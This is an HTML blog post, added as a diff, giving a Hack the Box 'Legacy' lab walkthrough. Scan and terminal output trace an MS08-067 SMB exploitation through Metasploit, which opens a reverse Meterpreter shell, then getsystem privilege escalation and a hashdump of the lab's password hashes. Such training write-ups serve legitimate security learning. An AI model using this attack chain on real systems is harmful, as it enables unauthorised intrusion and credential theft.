@@ -1,0 +1,237 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<meta charset="utf-8">
+	<title>Hack the Box - Legacy - Calxus Blog</title>
+
+  <!-- Edit site and author settings in `_config.yml` to make the social details your own -->
+
+    <meta content="Calxus Blog" property="og:site_name">
+  
+    <meta content="Hack the Box - Legacy" property="og:title">
+  
+  
+    <meta content="article" property="og:type">
+  
+  
+    <meta content="Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access." property="og:description">
+  
+  
+    <meta content="http://localhost:4000/legacy-walkthrough/" property="og:url">
+  
+  
+    <meta content="2020-03-14T19:43:22+00:00" property="article:published_time">
+    <meta content="http://localhost:4000/about/" property="article:author">
+  
+  
+    <meta content="http://localhost:4000/assets/img/legacy.png" property="og:image">
+  
+  
+    
+    <meta content="HackTheBox" property="article:section">
+    
+  
+  
+    
+    <meta content="Easy" property="article:tag">
+    
+    <meta content="Windows" property="article:tag">
+    
+    <meta content="Retired" property="article:tag">
+    
+    <meta content="CVE" property="article:tag">
+    
+  
+  
+
+    <meta name="twitter:card" content="summary">
+    <meta name="twitter:site" content="@">
+    <meta name="twitter:creator" content="@TheCalxus">
+  
+    <meta name="twitter:title" content="Hack the Box - Legacy">
+  
+  
+    <meta name="twitter:url" content="http://localhost:4000/legacy-walkthrough/">
+  
+  
+    <meta name="twitter:description" content="Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.">
+  
+  
+    <meta name="twitter:image:src" content="http://localhost:4000/assets/img/legacy.png">
+  
+
+	<meta name="description" content="Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+	<meta property="og:image" content="">
+	<link rel="shortcut icon" href="/assets/img/favicon/favicon.ico" type="image/x-icon">
+	<!-- Chrome, Firefox OS and Opera -->
+	<meta name="theme-color" content="#263959">
+	<!-- Windows Phone -->
+	<meta name="msapplication-navbutton-color" content="#263959">
+	<!-- iOS Safari -->
+	<meta name="apple-mobile-web-app-status-bar-style" content="#263959">
+	<!-- Google Fonts -->
+	<link href="https://fonts.googleapis.com/css?family=PT+Serif:400,700|Lato:300,400,700&display=swap" rel="stylesheet">
+	<!-- Font Awesome -->
+	<link rel="stylesheet" href="/assets/fonts/font-awesome/css/font-awesome.min.css">
+	<!-- Styles -->
+	<link rel="stylesheet" href="/assets/css/main.css">
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <aside class="sidebar">
+  <header>
+    <div class="about">
+      <div class="cover-author-image">
+        <a href="/"><img src="/assets/img/calxus.png" alt="Calxus"></a>
+      </div>
+      <div class="author-name">Calxus</div>
+      <p>DevOps Engineer with a penchant for pentesting and proud owner of an over-engineered home network</p>
+      <div style="height: 5px"></div>
+      <div class="author-name"><a href="/hackthebox">hack the box</a></div>
+      <div class="site-category"><a href="/homenetwork">home network</a></div>
+    </div>
+  </header> <!-- End Header -->
+  <footer>
+    <section class="contact">
+      <h3 class="contact-title">Contact me</h3>
+      <ul>
+        <li><a href="https://twitter.com/TheCalxus" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
+        <li class="github"><a href="http://github.com/calxus" target="_blank"><i class="fa fa-github"></i></a></li>
+        <li class="email"><a href="mailto:calxus@protonmail.ch"><i class="fa fa-envelope-o"></i></a></li>
+        <li><a href="https://hackthebox.eu/profile/317303" target="_blank"><i class="fa fa-cube"></i></a></li>
+      </ul>
+    </section> <!-- End Section Contact -->
+    <div class="copyright">
+      <p>2021 &copy; Calxus</p>
+    </div>
+  </footer> <!-- End Footer -->
+</aside> <!-- End Sidebar -->
+<div class="content-box clearfix">
+  <article class="article-page">
+  <div class="page-content">
+    
+    <div class="page-cover-image">
+      <figure>
+        <img class="page-image" src=/assets/img/legacy.png alt="Hack the Box - Legacy">
+        
+          <figcaption>Legacy</figcaption>
+        
+      </figure>
+    </div> <!-- End Page Cover Image -->
+    
+    <div class="wrap-content">
+      <header class="header-page">
+        <h1 class="page-title">Hack the Box - Legacy</h1>
+        <div class="page-date"><span>2020, Mar 14&nbsp;&nbsp;&nbsp;&nbsp;</span></div>
+      </header>
+      <h2 id="overview">Overview</h2>
+<p>Legacy is a fairly straightforward beginner-level machine which demonstrates the potential security risks of SMB on Windows. Only one publicly available exploit is required to obtain administrator access.</p>
+<h2 id="enumeration">Enumeration</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~]
+└─$ sudo nmap -p- -T4 10.129.113.57                                                   
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 13:41 GMT
+Nmap scan report for 10.129.113.57
+Host is up (0.017s latency).
+Not shown: 65532 filtered ports
+PORT     STATE  SERVICE
+139/tcp  open   netbios-ssn
+445/tcp  open   microsoft-ds
+3389/tcp closed ms-wbt-server
+</code></pre></div></div>
+<p>After running initial port enumeration the ports that seem most of interest are 139,445. A quick vulnerability scan reveals it is potentially vulnerable to MS08-067.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~]
+└─$ sudo nmap -p139,445 --script vuln 10.129.113.57 
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-03-14 13:44 GMT
+...
+| smb-vuln-ms08-067: 
+|   VULNERABLE:
+|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
+|     State: VULNERABLE
+|     IDs:  CVE:CVE-2008-4250
+|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
+|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
+|           code via a crafted RPC request that triggers the overflow during path canonicalization.
+</code></pre></div></div>
+<h2 id="foothold">Foothold</h2>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>┌──[10.10.14.27]-(calxus㉿calxus)-[~/hackthebox]
+└─$ searchsploit ms08-067
+--------------------------------------------------------- ---------------------------------
+ Exploit Title                                           |  Path
+--------------------------------------------------------- ---------------------------------
+Microsoft Windows - 'NetAPI32.dll' Code Execution (Pytho | windows/remote/40279.py
+Microsoft Windows Server - Code Execution (MS08-067)     | windows/remote/7104.c
+Microsoft Windows Server - Code Execution (PoC) (MS08-06 | windows/dos/6824.txt
+Microsoft Windows Server - Service Relative Path Stack C | windows/remote/16362.rb
+Microsoft Windows Server - Universal Code Execution (MS0 | windows/remote/6841.txt
+Microsoft Windows Server 2000/2003 - Code Execution (MS0 | windows/remote/7132.py
+--------------------------------------------------------- ---------------------------------
+</code></pre></div></div>
+<p>Searching through exploitdb reveals that there are a number of exploits that we could use. As there is a metasploit module listed we will give that a quick go first. We can open up the msfconsole and search for the vulnerability there.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 &gt; search ms08-067
+
+Matching Modules
+================
+
+   #  Name                                 Disclosure Date  Rank   Check  Description
+   -  ----                                 ---------------  ----   -----  -----------
+   0  exploit/windows/smb/ms08_067_netapi  2008-10-28       great  Yes    MS08-067 Microsoft Server Service Relative Path Stack Corruption
+</code></pre></div></div>
+<p>After finding it we select it, enter the appropriate IP’s as options and give it a run. This should return as a meterpreter session.</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msf6 exploit(windows/smb/ms08_067_netapi) &gt; exploit
+
+[*] Started reverse TCP handler on 10.10.14.27:4444 
+[*] 10.129.113.57:445 - Automatically detecting the target...
+[*] 10.129.113.57:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
+[*] 10.129.113.57:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
+[*] 10.129.113.57:445 - Attempting to trigger the vulnerability...
+[*] Sending stage (175174 bytes) to 10.129.113.57
+[*] Meterpreter session 1 opened (10.10.14.27:4444 -&gt; 10.129.113.57:1057) at 2021-03-14 14:08:04 +0000
+
+meterpreter &gt;
+</code></pre></div></div>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<p>Once we have the meterpreter session, it is slightly more diifcult to enumerate which user we are as it is pre Windows XP SP2 and thus the “whoami” command does not exist yet. But we can either use PsExec to get a system shell or simply use the “getsystem” meterpreter command</p>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>meterpreter &gt; getsystem
+...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).
+meterpreter &gt; hashdump
+Administrator:500:b47234f31e261b47587db580d0d5f393:b1e8bd81ee9a6679befb976c0b9b6827:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+HelpAssistant:1000:0ca071c2a387b648559a926bfe39f8d7:332e3bd65dbe0af563383faff76c6dc5:::
+john:1003:dc6e5a1d0d4929c2969213afe9351474:54ee9a60735ab539438797574a9487ad:::
+SUPPORT_388945a0:1002:aad3b435b51404eeaad3b435b51404ee:f2b8398cafc7174be746a74a3a7a3823:::
+</code></pre></div></div>
+
+      <div class="page-footer">
+        <div class="page-share">
+          <a href="https://twitter.com/intent/tweet?text=Hack the Box - Legacy&url=http://localhost:4000/legacy-walkthrough/" title="Share on Twitter" rel="nofollow" target="_blank">Twitter</a>
+          <a href="https://facebook.com/sharer.php?u=http://localhost:4000/legacy-walkthrough/" title="Share on Facebook" rel="nofollow" target="_blank">Facebook</a>
+          <a href="https://plus.google.com/share?url=http://localhost:4000/legacy-walkthrough/" title="Share on Google+" rel="nofollow" target="_blank">Google+</a>
+        </div>
+        <div class="page-tag">
+          
+            <a href="/tags#Easy" class="tag">&#35; Easy</a>
+          
+            <a href="/tags#Windows" class="tag">&#35; Windows</a>
+          
+            <a href="/tags#Retired" class="tag">&#35; Retired</a>
+          
+            <a href="/tags#CVE" class="tag">&#35; CVE</a>
+          
+        </div>
+      </div>
+    </div> <!-- End Wrap Content -->
+  </div> <!-- End Page Content -->
+</article> <!-- End Article Page -->
+
+</div>
+
+  </div>
+  <script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload@12.0.0/dist/lazyload.min.js"></script>
+<script src="/assets/js/main.js"></script>
+
+</body>
+</html>
